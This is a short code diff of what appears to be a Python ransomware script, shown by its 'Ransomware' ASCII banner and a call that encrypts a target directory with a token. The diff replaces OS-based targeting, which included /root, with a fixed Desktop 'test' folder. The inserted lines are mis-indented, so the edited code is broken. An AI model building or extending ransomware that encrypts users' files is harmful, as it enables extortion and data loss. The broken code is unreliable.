@@ -86,17 +86,13 @@ def main():
      |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
     """
     print(ascii_art)
-    
-    # detect os
-    os_type = platform.system()
-    if os_type == "Windows":
-        target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
-    elif os_type == "Linux":
-        target = "/root"
-    else: 
-        print("Unsupported OS")
-        return
-    
+ # Automatically detect OS and set target directory
+target = os.path.join(os.path.expanduser("~"), "Desktop", "test")
+
+if not os.path.exists(target):
+    print("Folder does not exist.")
+    exit()
+
     # Encrypt the target directory
     if os.path.isdir(target):
         encrypt_directory(target, TOKEN)
